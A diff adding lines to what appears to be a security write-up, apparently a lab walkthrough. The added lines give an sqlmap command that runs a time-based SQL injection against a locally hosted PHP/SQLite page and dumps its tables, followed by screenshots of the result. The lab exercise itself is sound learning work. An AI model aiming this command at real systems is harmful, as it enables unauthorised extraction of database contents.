@@ -142,4 +142,16 @@ we can deploy php server locally using:
 ```
 php -S 0.0.0.0:80
 ``` 
+using sqlmap command: 
+```
+sqlmap -u "http://127.0.0.1:80/?payload=test" -p "payload" --dbms sqlite --technique=T --dump --level 5 --risk 3 --no-cast  --random-agent
+```
+
+Yessss! it works, sqlmap extract table names and data inside this tables: 
+
+![IMG9](https://github.com/0XMohomiester/0XMohomiester.github.io/assets/47929033/a3edd081-ee97-4f61-98f1-eac0a6ec8206)
+
+
+![IMG10](https://github.com/0XMohomiester/0XMohomiester.github.io/assets/47929033/6e17f82d-80ff-463e-848a-885b6d671b40)
+
 
